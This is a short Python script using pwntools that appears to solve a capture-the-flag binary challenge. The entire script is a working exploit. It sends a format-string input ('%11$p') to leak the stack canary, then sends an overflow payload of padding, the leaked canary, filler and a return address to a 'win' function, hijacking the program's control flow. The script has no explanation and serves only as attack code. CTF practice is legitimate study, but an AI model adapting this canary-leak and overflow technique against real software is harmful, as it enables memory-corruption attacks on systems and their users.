from pwn import *

target = process("./chall")

target.sendline(b"%11$p")

var = target.recvuntil(b"Hello, 0x")
canary = target.recvuntil(b".")[:-1].strip().decode()

print("Canary is", canary)

canary = int(canary,16)

win = 0x00401606

payload = b"A"*24
payload += p64(canary)
payload += b"B"*8
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)

